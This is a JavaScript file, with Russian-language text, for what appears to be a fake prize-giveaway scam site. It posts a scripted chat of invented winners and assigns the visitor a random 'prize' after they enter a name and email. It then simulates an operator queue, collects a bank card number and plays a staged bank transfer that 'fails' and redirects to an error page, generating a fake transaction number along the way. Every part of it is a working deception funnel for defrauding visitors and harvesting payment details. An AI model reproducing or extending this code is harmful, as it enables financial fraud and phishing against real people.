document.addEventListener('DOMContentLoaded', () => {

const messages =
[
  ["Наталья", "img/ppl/w1.jpg", "Всем привет, кто нибудь выигрывал?!"],
  ["Олег", "img/ppl/m1.jpg", "Да, получил 130 баксов"],
  ["Марина", "img/ppl/w2.jpg", "Олег, молодец)"],
  ["USER 39431", "undefined", "у меня 50 выпало)))"],
  [
    "Ирина Сергеевна",
    "img/ppl/w3.jpg",
    "Я сюда через инстаграм одна попала?",
  ],
  [
    "USER05339",
    "undefined",
    "Не знаю, мне лично в директ приграшение пришло",
  ]
];

const randomTime = Math.floor(Math.random() * 1500) + 1000; // от 1000 до 2500

const pages_id = {
  "1": "index.html",
  "2": "cashout.html",
  "3": "operator.html",
  "4": "bank.html",
  "5": "bank_error.html"
}

if (localStorage['msg-id']) {
  returnAllMessege();
  addMessegeFromLast();
}
else if (localStorage['msg-id'] == null) {
  let i = 0;

  const messageInterval = setInterval(() => {
    if (i >= messages.length) {
      i = 0;
    }
    localStorage['msg-id'] = i;
    messageAdd(i);
    i++;
  }, randomTime + 2000);
}

function returnAllMessege() {
  for (let i = 0; i <= localStorage['msg-id']; i++) {
    messageAdd(i);
  }
}

function addMessegeFromLast() {
  let i = parseInt(localStorage['msg-id']) + 1;
  
  const messageInterval = setInterval(() => {
    if (i >= messages.length) {
      i = 0;
    }
    localStorage['msg-id'] = i;
    messageAdd(i);
    i++;
  }, randomTime + 2000);
}

function messageAdd(i) {
  const container = document.querySelector('#msg33');
  const message = document.createElement('div');
  message.classList.add('onemessagevbr');
  
  const msgTime = new Date().getHours() + ':' + new Date().getMinutes();

  message.innerHTML = `
    <img src="${messages[i][1]}" class="avavbr">
    <div class="messagetxt">
      <div class="chatvbrname">${messages[i][0]}</div>
      <div class="jegkergd"><span class="djhg">${messages[i][2]}</span>
        <div class="timechatvbr">${msgTime}</div>
      </div>
    </div>
  `;

  container.append(message);
}

function sendMessege() {
  const input = document.querySelector('#sent'),
        btn = document.querySelector('.chatimg2'),
        container = document.querySelector('#msg33');

  btn.addEventListener('click', () => {
    const inputValue = input.value;
    const message = document.createElement('div');
    message.classList.add('onemessagevbr');
    
    const msgTime = new Date().getHours() + ':' + new Date().getMinutes();

    message.innerHTML = `
      <img src="${''}" class="avavbr">
      <div class="messagetxt main-msg">
        <div class="chatvbrname">${localStorage['name']}</div>
        <div class="jegkergd"><span class="djhg">${inputValue}</span>
          <div class="timechatvbr">${msgTime}</div>
        </div>
      </div>
    `;

    container.append(message);
    input.value = '';
    document.getElementById('msg33').lastChild.scrollIntoView(false)    
    window.scrollBy(0, window.pageYOffset);
  });
}
sendMessege();

if (document.querySelector('.user-name')) {
  const username = document.querySelectorAll('.user-name');

  for (let i = 0; i < username.length; i++) {
    if (localStorage['name']) {
      username[i].innerHTML = localStorage['name'];
    }
    else {
      username[i].innerHTML = '';
    }
  }
}

if (document.querySelector('.user-card')) {
  const usercard = document.querySelectorAll('.user-card');

  for (let i = 0; i < usercard.length; i++) {
    usercard[i].innerHTML = localStorage['user-card'];
  }
}

if (document.querySelector('.user-money')) {
  const usermoney = document.querySelectorAll('.user-money');

  for (let i = 0; i < usermoney.length; i++) {
    usermoney[i].innerHTML = localStorage['user-money'] + ' $';
  }
}

if (document.querySelector('.user-money-xaf')) {
  const usermoneyXAF = document.querySelectorAll('.user-money-xaf');

  for (let i = 0; i < usermoneyXAF.length; i++) {
    usermoneyXAF[i].innerHTML = localStorage['user-money-xaf'] + ' $';
  }
}

if ((page_id == 1 && localStorage.getItem('page_id') == null) || (page_id == 1 && localStorage.getItem('page_id') == '1')) {
  // анимация загрузки сайта
  const loadingSite = document.querySelector('#loading');

  setTimeout(() => {
  loadingSite.style.display = 'none';
  }, randomTime);

  const modal1 = document.querySelector('#modal1');
  setTimeout(() => {
    modal1.style.display = 'block';
  }, randomTime);
  
  
  localStorage.setItem('page_id', page_id);
  modal1Close();

  const mainBtn = document.querySelector('.main-btn');

  mainBtn.addEventListener('click', () => {
    const name = document.querySelector('#input-name'),
          email = document.querySelector('#input-email'),
          child = document.querySelector('#input-child');
    
    if (name.value == '') {
      name.previousElementSibling.style.display = 'inline-block';
    }
    else {
      name.previousElementSibling.style.display = 'none';
    }

    if (email.value == '') {
      email.previousElementSibling.style.display = 'inline-block';
    }
    else {
      email.previousElementSibling.style.display = 'none';
    }

    if (child.value == '') {
      child.previousElementSibling.style.display = 'inline-block';
    }
    else {
      child.previousElementSibling.style.display = 'none';
    }

    if (name.value != '' && email.value != '' && child.value != '') {
      localStorage['email'] = email.value;
      localStorage['child'] = child.value;

      name.value = '';
      email.value = '';
      child.value = '';

      const modal4 = document.querySelector('#modal4'),
            blur = document.querySelector('#blur'),
            body = document.querySelector('body'),
            btnWin = document.querySelector('#buttonwin'),
            randomValueMoney = Math.floor(Math.random() * 1000) + 1000;

      localStorage['user-money'] = randomValueMoney;
      localStorage['user-money-xaf'] = randomValueMoney * 538,45;

      modal4.style.display = 'block';
      blur.style.display = 'block';
      body.style.overflow = 'hidden';

      let i = 0;

      const moneyReceived = setInterval(() => {
        if (i > randomValueMoney) {
          clearInterval(moneyReceived);
        }
        else {
          const out = document.querySelector('#out');
          out.innerHTML = i;
          i++;
          console.log(i);
        }
      },1);

      btnWin.addEventListener('click', () => {
        window.location = `${pages_id[2]}`;
      })
    }
  })
}
else if (page_id == 1 && localStorage.getItem('page_id') != '1') {
  const modal7 = document.querySelector('#modal7'),
        loadingSite = document.querySelector('#loading'),
        modal7Btn = document.querySelector('#modal7 .modalbutton');

  setTimeout(() => {
    loadingSite.style.display = 'none';
    modal7.style.display = 'block';
  }, randomTime);

  modal7Btn.addEventListener('click', () => {
    window.location = `${pages_id[localStorage['page_id']]}`;
  });
}
else if (page_id != 1 && localStorage.getItem('page_id') == null) {
  window.location = `${pages_id[1]}`;
}
else if (page_id == 2 && localStorage['page_id'] == 2 || page_id == 2 && localStorage['page_id']  ) {
  localStorage['page_id'] = page_id;

  const peoples = document.querySelector('#peoples'),
        peoplesText = ['Перед вами в очереди 3 человека','Перед вами в очереди 2 человека','Перед вами в очереди 1 человек','Идёт соединение с оператором'];

  let i = 0;

  const peoplesInterval = setInterval(() => {
    peoples.innerHTML = peoplesText[i];
    i++;

    if (i >= peoplesText.length) {
      clearInterval(peoplesInterval);

      const loadgif = document.querySelector('#loadgif'),
            loadgif2 = document.querySelector('#loadgif2');
  
      loadgif.style.display = 'none';
      loadgif2.style.display = 'inline-block';

      setTimeout(() => {
        const preload = document.querySelector('#preload'),
              preload2 = document.querySelector('#preload2');

        preload.style.display = 'none';
        preload2.style.display = 'block';
        
        document.querySelector('.loadtext').style.display = 'block';
        let i = 0;

        const loadedTextInterval = setInterval(() => {
          const loadedText = document.querySelectorAll('.loadtext');

            loadedText[i].style.display = 'none';
            loadedText[i+1].style.display = 'block';
            loadedText[i].nextElementSibling.style.display = 'block';
            console.log(Math.floor(Math.random() * 5000) + 2000);
          
            if (i >= 3) {
              clearInterval(loadedTextInterval);
              loadedText[i+1].style.display = 'none';
              setTimeout(() => {
                document.querySelector('.buttonchat').style.display = 'block';
              }, 1000);
            }
          i++;
        }, Math.floor(Math.random() * 5000) + 2000);
      }, randomTime); // время соединения с оператором
    }
  }, randomTime); // время смены людей в очереди
}
else if (page_id == 2 && localStorage['page_id'] > 2) {
  window.location = `${pages_id[localStorage['page_id']]}`;
}
else if (page_id == 3 && localStorage['operatorWrote'] == null) {
  localStorage['page_id'] = page_id;
  const preload = document.querySelector('#preload'),
        preload2 = document.querySelector('#preload2');

  preload.style.display = 'block';
  preload2.style.display = 'none';
  setTimeout(() => {

    preload.style.display = 'none';
    preload2.style.display = 'block';

    if (preload2.style.display == 'block') {
      setTimeout(() => {
        document.querySelector('.loadtext').style.display = 'block';
        localStorage['operatorWrote'] = true;

        let i = 0;
        const loadedTextInterval = setInterval(() => {
          const loadedText = document.querySelectorAll('.loadtext');
  
          loadedText[i].style.display = 'none';
          loadedText[i+1].style.display = 'block';
          loadedText[i].nextElementSibling.style.display = 'block';
          console.log(i);
          i++;
          if (i >= 4) {
            clearInterval(loadedTextInterval);
            loadedText[i].style.display = 'none';
            setTimeout(() => {
              document.querySelector('#msg5').style.display = 'block';

            }, 1000);
          };
        }, randomTime + 2000); // время вывода сообщений randomTime + 2000
      }, randomTime);

    }
  }, randomTime + 2000); // время обработки согласия random + 2000


}
else if (page_id == 3 && localStorage['operatorWrote'] == 'true') {
  const message = document.querySelectorAll('.message'),
        messageBtn = document.querySelector('#msg5');

  for(let i = 0; i < message.length; i++) {
    message[i].style.display = 'block';
  }
  messageBtn.style.display = 'block';
}
else if (page_id == 4) {
  localStorage['page_id'] = page_id;
  const cardBtn = document.querySelector('.card-btn'),
        cardInput = document.querySelector('.cardnumber'),
        cardWarning = document.querySelector('#txt');

  cardBtn.addEventListener('click', () => {
    const form = document.querySelector('#form'),
          loads = document.querySelector('#loads');

    if (cardInput.value == '') {
      cardWarning.innerHTML = 'Укажите свои реквизиты!';
    }
    else {
      localStorage['user-card'] = cardInput.value;
      form.style.display = 'none';
      loads.style.display = 'block';
      let i = 0;

      const loadsInterval = setInterval(() => {
        const wi = document.querySelector('#wi'),
              wiArr = ['Соединение со шлюзом банка','Подготовка перевода средств','Создание банковского поручения...','Поручение отправленно','Перевод средств...','Перевод средств... Попытка 2','Перевод средств... Попытка 3','Банк получатель отклонил операцию, вернув код 409','Идет переадресация на страницу для решения проблемы'];

        wi.innerHTML = wiArr[i];
        i++;

        if (i >= wiArr.length) {
          clearInterval(loadsInterval);
          setTimeout(() => {
            window.location = '/bank_error.html';
          }, 2000);
        }
      }, randomTime + 2000);
    }
  });

}
else if (page_id == 5) {
  localStorage['page_id'] = page_id;

  // номер транзакции
  if (localStorage['transaction']) {
    document.querySelector('.user-transaction').innerHTML = '№' + localStorage['transaction'];
  }
  else {
    const transaction = Math.floor(Math.random() * 514593453534) + 114593453534;
    localStorage['transaction'] = transaction;
    document.querySelector('.user-transaction').innerHTML = '№' + localStorage['transaction'];
    console.log('ok')
  }

  // дата платежа
  if (localStorage['payment-date']) {
    const paymentDate = document.querySelector('.payment-date');
    paymentDate.innerHTML = localStorage['payment-date'];
  }
  else {
    const paymentDate = document.querySelector('.payment-date');

    function getFormattedDate(date) {
      let year = date.getFullYear();
      let month = (1 + date.getMonth()).toString().padStart(2, '0');
      let day = date.getDate().toString().padStart(2, '0');
    
      return day + '.' + month + '.' + year;
    }
    localStorage['payment-date'] = getFormattedDate(new Date())
    paymentDate.innerHTML = localStorage['payment-date'];
  }
}

// Первое модальное окно, в котором мы указываем email
function modal1Close() {
  const btnModal1 = document.querySelector('#modal1 .modalbutton'),
        blur = document.querySelector('#blur'),
        body = document.querySelector('#body'),
        name = document.querySelector('#name');

  btnModal1.addEventListener('click', () => {
    if (name.value != '') {
      btnModal1.closest('.modalfade1').style.display = 'none';
      blur.style.display = 'none';
      body.style.overflow = 'auto';

      localStorage.setItem('name', name.value); // добавляем имя в localStrorage
      alert(`Добро пожаловать ${name.value}`);
      name.value = '';
    }
    else {
      alert('Укажите электронную почту!')  
    }
  });
}


});
